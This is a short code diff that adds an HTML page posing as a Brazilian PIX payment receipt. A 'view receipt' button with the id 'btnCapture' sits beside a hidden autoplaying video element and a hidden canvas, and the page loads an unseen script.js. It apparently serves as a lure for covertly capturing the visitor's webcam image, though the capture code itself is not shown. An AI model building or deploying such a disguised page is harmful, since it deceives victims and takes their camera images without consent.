@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PIX Comprovante</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+    <h1>Comprovante de Pagamento PIX</h1>
+    <p>Clique no botão abaixo para visualizar o comprovante.</p>
+    <button id="btnCapture">Visualizar Comprovante</button>
+    <video id="video" width="640" height="480" autoplay style="display: none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
+</body>
+</html>
